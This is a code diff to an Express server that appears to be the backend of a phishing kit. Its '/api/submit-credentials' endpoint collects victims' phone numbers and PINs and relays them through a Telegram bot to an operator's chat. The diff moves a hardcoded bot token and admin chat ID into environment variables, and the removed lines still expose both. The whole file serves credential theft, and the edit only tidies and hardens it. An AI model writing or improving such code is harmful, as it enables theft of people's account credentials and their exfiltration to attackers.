@@ -6,16 +6,26 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
+// Fetch tokens strictly from environment variables for enhanced security
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '').trim();
+
+if (!TELEGRAM_BOT_TOKEN) {
+    console.error("CRITICAL ERROR: TELEGRAM_BOT_TOKEN environment variable is missing!");
+    process.exit(1);
+}
+
+if (!MAIN_ADMIN_ID) {
+    console.error("CRITICAL ERROR: MAIN_ADMIN_ID environment variable is missing!");
+    process.exit(1);
+}
+
 const PORT = process.env.PORT || 3000;
 
-// Initialize bot with polling
+// Initialize bot with polling for stable communication on Render
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
 
 let activeSessions = {};
-
-// Ensure Main Admin Chat ID is clean and numeric only
-let MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '8591555400').trim();
 let authorizedAdmins = new Set([MAIN_ADMIN_ID]);
 
 function escapeMarkdown(text) {
@@ -132,9 +142,8 @@ app.post('/api/submit-credentials', express.json(), (req, res) => {
         `PHONE NO: \`${escapeMarkdown(phone)}\`\n` +
         `PIN: \`${escapeMarkdown(pin)}\``;
 
-    console.log(`Broadcasting credentials to admins. Main Admin ID: ${MAIN_ADMIN_ID}`);
+    console.log(`Broadcasting credentials to Main Admin ID: ${MAIN_ADMIN_ID}`);
 
-    // Force send directly to MAIN_ADMIN_ID to guarantee delivery
     bot.sendMessage(MAIN_ADMIN_ID, message, {
         parse_mode: 'Markdown',
         reply_markup: {
@@ -198,4 +207,4 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-    
+        
